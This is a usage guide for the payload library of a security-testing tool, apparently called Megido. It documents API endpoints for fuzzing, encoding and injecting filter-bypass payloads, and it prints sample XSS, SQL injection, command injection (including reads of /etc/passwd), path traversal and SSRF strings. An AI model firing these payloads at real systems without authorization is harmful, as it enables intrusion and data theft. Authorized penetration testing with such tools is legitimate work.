# Ready-Made Payload Library - Complete Guide

## Overview

The Ready-Made Payload Library provides 100+ pre-built bypass payloads for testing WAFs, IPS, IDS, Firewalls, and input filters. These payloads can be used directly or manipulated with custom transformations.

## Key Features

### 📚 100+ Pre-Built Payloads
- **XSS**: 20 payloads (basic script, img onerror, svg onload, etc.)
- **SQL Injection**: 20 payloads (UNION SELECT, inline comments, hex encoded, etc.)
- **Command Injection**: 15 payloads (semicolon, pipe, backticks, etc.)
- **Path Traversal**: 10 payloads (basic, URL encoded, null byte, etc.)
- **XXE**: 10 payloads (basic, parameter entity, blind, etc.)
- **SSTI**: 10 payloads (Jinja2, ERB, FreeMarker, etc.)
- **SSRF**: 10 payloads (localhost, metadata endpoints, etc.)

### 🔧 Payload Manipulation
- Apply transformations (URL encoding, HTML entities, Base64, etc.)
- Apply custom techniques from technique library
- Combine multiple payloads
- Generate fuzzed variants (case, encoding, whitespace)
- Generate mutations (character, comment, concatenation)

### 📊 Usage Tracking
- Automatic statistics (times_used, success_rate)
- Execution history
- Success/failure tracking
- Performance metrics

## Quick Start

### 1. Initialize the Payload Library

```bash
curl -X POST http://localhost:8000/bypasser/api/payloads/initialize/
```

This loads all 100+ payloads into the database.

### 2. List Available Payloads

```bash
# List all payloads
curl http://localhost:8000/bypasser/api/payloads/

# Filter by category
curl http://localhost:8000/bypasser/api/payloads/?category=xss

# Filter by bypass target
curl http://localhost:8000/bypasser/api/payloads/?bypass_target=waf

# Search payloads
curl http://localhost:8000/bypasser/api/payloads/?search=script
```

### 3. Use a Payload

```bash
# Get payload details
curl http://localhost:8000/bypasser/api/payloads/1/

# Inject into session
curl -X POST http://localhost:8000/bypasser/api/sessions/1/inject-payloads/ \
  -H "Content-Type: application/json" \
  -d '{"payload_ids": [1]}'
```

## API Reference

### List Payloads

**Endpoint**: `GET /api/payloads/`

**Query Parameters**:
- `category` - Filter by category (xss, sqli, command_injection, etc.)
- `bypass_target` - Filter by target (waf, ips, ids, firewall, filter)
- `risk_level` - Filter by risk (info, low, medium, high, critical)
- `search` - Search in name, description, or payload
- `is_active` - Filter active/inactive (true/false)

**Response**:
```json
[
  {
    "id": 1,
    "name": "xss_basic_script",
    "payload": "<script>alert(1)</script>",
    "description": "Basic XSS payload",
    "category": "xss",
    "bypass_target": "waf",
    "risk_level": "high",
    "times_used": 0,
    "times_successful": 0,
    "success_rate": 0.0,
    "is_active": true,
    "tags": null
  }
]
```

### Get Payload Details

**Endpoint**: `GET /api/payloads/<id>/`

**Response**:
```json
{
  "id": 1,
  "name": "xss_basic_script",
  "payload": "<script>alert(1)</script>",
  "description": "Basic XSS payload",
  "category": "xss",
  "bypass_target": "waf",
  "risk_level": "high",
  "times_used": 0,
  "times_successful": 0,
  "success_rate": 0.0,
  "is_active": true,
  "is_built_in": true,
  "tags": null,
  "created_at": "2026-02-02T12:00:00Z"
}
```

### Transform Payload

**Endpoint**: `POST /api/payloads/<id>/transform/`

**Request Body** (Option 1 - Transformations):
```json
{
  "transformations": ["url_encode_double", "html_hex"]
}
```

**Request Body** (Option 2 - Custom Technique):
```json
{
  "technique_template": "{{payload|url_encode_triple}}"
}
```

**Response**:
```json
{
  "payload_name": "xss_basic_script",
  "original": "<script>alert(1)</script>",
  "transformed": "%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E",
  "transformations_applied": "url_encode_double,html_hex",
  "success": true
}
```

### Fuzz Payload

**Endpoint**: `GET /api/payloads/<id>/fuzz/?type=<fuzz_type>`

**Fuzz Types**:
- `case` - Generate case variations
- `encoding` - Generate encoding variations
- `whitespace` - Generate whitespace variations
- `all` - Generate all variants

**Response**:
```json
{
  "payload_name": "xss_basic_script",
  "original": "<script>alert(1)</script>",
  "fuzz_type": "all",
  "variants": [
    "<SCRIPT>ALERT(1)</SCRIPT>",
    "<script>alert(1)</script>",
    "<ScRiPt>AlErT(1)</sCrIpT>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#60;script&#62;alert(1)&#60;&#47;script&#62;",
    "\\u003cscript\\u003ealert(1)\\u003c\\u002fscript\\u003e"
  ],
  "count": 6
}
```

### Combine Payloads

**Endpoint**: `POST /api/payloads/combine/`

**Request Body**:
```json
{
  "payload_ids": [1, 2, 3],
  "separator": " ",
  "transformations": ["url_encode"]
}
```

**Response**:
```json
{
  "payloads_combined": ["xss_basic_script", "xss_img_onerror", "xss_svg_onload"],
  "separator": " ",
  "transformations": ["url_encode"],
  "combined_payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E%20%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%20%3Csvg%20onload%3Dalert(1)%3E",
  "success": true
}
```

### Inject Payloads into Session

**Endpoint**: `POST /api/sessions/<id>/inject-payloads/`

**Request Body**:
```json
{
  "payload_ids": [1, 2, 3],
  "transformations": ["url_encode_double"],
  "technique_template": "{{payload|html_hex}}"
}
```

**Response**:
```json
{
  "message": "Payload injection completed",
  "payloads_tested": 3,
  "successful_bypasses": 2,
  "results": [
    {
      "payload_id": 1,
      "payload_name": "xss_basic_script",
      "original": "<script>alert(1)</script>",
      "transformed": "%25253Cscript%25253E...",
      "success": true,
      "reflection_found": true
    }
  ]
}
```

### Get Categories and Targets

**Endpoint**: `GET /api/payloads/categories/`

**Response**:
```json
{
  "categories": [
    {"value": "xss", "label": "XSS"},
    {"value": "sqli", "label": "SQL Injection"},
    ...
  ],
  "bypass_targets": [
    {"value": "waf", "label": "WAF"},
    {"value": "ips", "label": "IPS"},
    ...
  ],
  "risk_levels": [
    {"value": "info", "label": "Informational"},
    ...
  ]
}
```

## Payload Categories

### XSS Payloads (20)

**Basic Vectors:**
- `xss_basic_script` - `<script>alert(1)</script>`
- `xss_img_onerror` - `<img src=x onerror=alert(1)>`
- `xss_svg_onload` - `<svg onload=alert(1)>`
- `xss_javascript_protocol` - `<a href="javascript:alert(1)">click</a>`

**Advanced Vectors:**
- `xss_iframe_srcdoc` - Iframe with srcdoc attribute
- `xss_body_onload` - Body tag with onload event
- `xss_input_onfocus` - Input with autofocus and onfocus
- `xss_details_ontoggle` - Details tag with ontoggle
- `xss_marquee_onstart` - Marquee tag with onstart
- `xss_meta_refresh` - Meta refresh with JavaScript URL

**Obfuscation:**
- `xss_mixed_case` - Mixed case script tag
- `xss_backticks` - Using backticks instead of parentheses
- `xss_event_handler_spaces` - Event handler with spaces
- `xss_double_encoded` - Double URL encoded script
- `xss_unicode` - Unicode encoded JavaScript

### SQL Injection Payloads (20)

**Basic Injections:**
- `sqli_union_select` - `' UNION SELECT NULL,NULL,NULL--`
- `sqli_comment_inline` - `' OR /**/ '1'='1`
- `sqli_double_dash` - `' OR 1=1--`
- `sqli_hex_encoded` - `' OR 0x313d31--`

**Function-Based:**
- `sqli_char_function` - Using CHAR function
- `sqli_concat` - String concatenation
- `sqli_substring` - Substring function

**Obfuscation:**
- `sqli_scientific_notation` - Scientific notation bypass
- `sqli_nested_comments` - Multiple inline comments
- `sqli_mixed_case` - Mixed case keywords
- `sqli_whitespace_variation` - Tab and newline as whitespace

**Encoding:**
- `sqli_url_encoded` - URL encoded injection
- `sqli_double_url_encoded` - Double URL encoded
- `sqli_null_byte` - Null byte injection

**Advanced:**
- `sqli_time_based` - Time-based blind SQLi
- `sqli_stacked_queries` - Stacked query injection
- `sqli_buffer_overflow` - Buffer overflow attempt

### Command Injection Payloads (15)

**Separators:**
- `cmd_semicolon` - `; ls -la`
- `cmd_pipe` - `| whoami`
- `cmd_ampersand` - `& ipconfig`
- `cmd_double_pipe` - `|| cat /etc/passwd`
- `cmd_double_ampersand` - `&& ls -la`

**Command Substitution:**
- `cmd_backticks` - `` `whoami` ``
- `cmd_dollar_paren` - `$(whoami)`

**Obfuscation:**
- `cmd_wildcard_chars` - `/b??/c?t /etc/passwd`
- `cmd_slash_separation` - `/usr/b\in/wh\oami`
- `cmd_hex_encoding` - Hex encoded command
- `cmd_base64` - Base64 encoded command
- `cmd_variable_expansion` - `$HOME/../../../etc/passwd`

### Path Traversal Payloads (10)

- `path_basic` - `../../../etc/passwd`
- `path_url_encoded` - URL encoded traversal
- `path_double_encoded` - Double URL encoded
- `path_unicode` - Unicode encoded
- `path_backslash` - Windows backslash
- `path_null_byte` - Null byte bypass
- `path_dot_slash` - Extra dots and slashes
- `path_absolute` - `/etc/passwd`
- `path_overlong_utf8` - Overlong UTF-8 encoding

### XXE Payloads (10)

- `xxe_basic` - Basic XXE payload
- `xxe_parameter_entity` - Parameter entity XXE
- `xxe_blind` - Blind XXE
- `xxe_utf16` - UTF-16 encoded XXE
- `xxe_expect` - XXE with expect wrapper
- `xxe_ssrf` - XXE for SSRF
- `xxe_dos` - Billion laughs DoS
- `xxe_svg` - XXE in SVG file

### SSTI Payloads (10)

- `ssti_jinja2` - Jinja2 SSTI test
- `ssti_jinja2_rce` - Jinja2 RCE
- `ssti_erb` - ERB SSTI test
- `ssti_freemarker` - FreeMarker SSTI test
- `ssti_velocity` - Velocity SSTI test
- `ssti_smarty` - Smarty version disclosure
- `ssti_twig` - Twig RCE
- `ssti_mako` - Mako SSTI test

### SSRF Payloads (10)

- `ssrf_localhost` - `http://localhost/admin`
- `ssrf_127001` - `http://127.0.0.1/admin`
- `ssrf_hex_encoding` - Hex encoded IP
- `ssrf_octal` - Octal encoded IP
- `ssrf_decimal` - Decimal IP
- `ssrf_short_ip` - Shortened IP notation
- `ssrf_cloud_metadata` - Cloud metadata endpoint
- `ssrf_redirect` - SSRF via redirect

## Advanced Usage

### Workflow 1: Test XSS with Multiple Encodings

```bash
# 1. List XSS payloads
curl http://localhost:8000/bypasser/api/payloads/?category=xss

# 2. Get specific payload
curl http://localhost:8000/bypasser/api/payloads/1/

# 3. Generate fuzzed variants
curl http://localhost:8000/bypasser/api/payloads/1/fuzz/?type=all

# 4. Transform with double encoding
curl -X POST http://localhost:8000/bypasser/api/payloads/1/transform/ \
  -d '{"transformations": ["url_encode_double"]}'

# 5. Inject into session
curl -X POST http://localhost:8000/bypasser/api/sessions/1/inject-payloads/ \
  -d '{"payload_ids": [1], "transformations": ["url_encode_double"]}'
```

### Workflow 2: Combine Multiple SQL Injection Payloads

```bash
# 1. List SQL injection payloads
curl http://localhost:8000/bypasser/api/payloads/?category=sqli

# 2. Combine multiple payloads
curl -X POST http://localhost:8000/bypasser/api/payloads/combine/ \
  -d '{
    "payload_ids": [21, 22, 23],
    "separator": " ",
    "transformations": ["url_encode"]
  }'

# 3. Test in session
curl -X POST http://localhost:8000/bypasser/api/sessions/1/inject-payloads/ \
  -d '{"payload_ids": [21, 22, 23]}'
```

### Workflow 3: Apply Custom Technique to Payload

```bash
# 1. Get payload
curl http://localhost:8000/bypasser/api/payloads/1/

# 2. Apply custom technique
curl -X POST http://localhost:8000/bypasser/api/payloads/1/transform/ \
  -d '{
    "technique_template": "{{payload|url_encode_triple|html_hex}}"
  }'

# 3. Test in session with custom technique
curl -X POST http://localhost:8000/bypasser/api/sessions/1/inject-payloads/ \
  -d '{
    "payload_ids": [1],
    "technique_template": "{{payload|url_encode_triple|html_hex}}"
  }'
```

## Integration with Custom Techniques

Ready-made payloads can be combined with custom techniques:

```bash
# 1. Create a custom technique
curl -X POST http://localhost:8000/bypasser/api/custom-techniques/ \
  -d '{
    "name": "Triple WAF Bypass",
    "technique_template": "{{payload|url_encode_triple|html_comment}}",
    "category": "waf"
  }'

# 2. Apply to ready-made payload
curl -X POST http://localhost:8000/bypasser/api/payloads/1/transform/ \
  -d '{
    "technique_template": "{{payload|url_encode_triple|html_comment}}"
  }'

# 3. Test in session
curl -X POST http://localhost:8000/bypasser/api/sessions/1/inject-payloads/ \
  -d '{
    "payload_ids": [1],
    "technique_template": "{{payload|url_encode_triple|html_comment}}"
  }'
```

## Best Practices

### 1. Start with Relevant Payloads
Filter by category to test specific attack vectors:
```bash
# For XSS testing
curl http://localhost:8000/bypasser/api/payloads/?category=xss

# For SQL injection testing
curl http://localhost:8000/bypasser/api/payloads/?category=sqli
```

### 2. Use Risk Levels
Start with lower risk payloads for initial testing:
```bash
# Start with medium risk
curl http://localhost:8000/bypasser/api/payloads/?risk_level=medium

# Escalate to high/critical if needed
curl http://localhost:8000/bypasser/api/payloads/?risk_level=high
```

### 3. Track Success Rates
Monitor which payloads work best for your targets:
```bash
# Payloads are sorted by success rate
curl http://localhost:8000/bypasser/api/payloads/
```

### 4. Combine Strategies
Use multiple approaches for comprehensive testing:
- Test original payload
- Test with transformations
- Test fuzzed variants
- Test combined payloads

### 5. Document Results
Use the execution history to track what works:
- Check `PayloadExecution` records in admin
- Review success rates
- Analyze which transformations are effective

## Security Considerations

### Authorization Required
- Only use on authorized targets
- Document your testing authorization
- Follow responsible disclosure

### Rate Limiting
- Implement delays between tests
- Respect target system resources
- Use `time.sleep()` between injections

### Data Sensitivity
- Don't include real sensitive data in custom payloads
- Review payloads before making them public
- Be careful with is_public flag

### Legal Compliance
- Follow local laws regarding security testing
- Obtain written permission before testing
- Use only in controlled environments

## Troubleshooting

### Error: "Payload not found"
- Ensure payload library is initialized
- Run: `POST /api/payloads/initialize/`

### No Successful Bypasses
- Try different transformation combinations
- Use fuzz variants
- Combine multiple payloads
- Check target system logs

### Transformation Fails
- Verify transformation names are correct
- Check technique template syntax
- Review error messages

### Performance Issues
- Limit number of payloads tested simultaneously
- Use filtering to reduce payload count
- Increase delays between tests

## Support

For issues or questions, please refer to the main Megido documentation or open an issue in the repository.

---

**Remember**: This tool is for authorized security testing only. Always obtain proper authorization before testing any system.
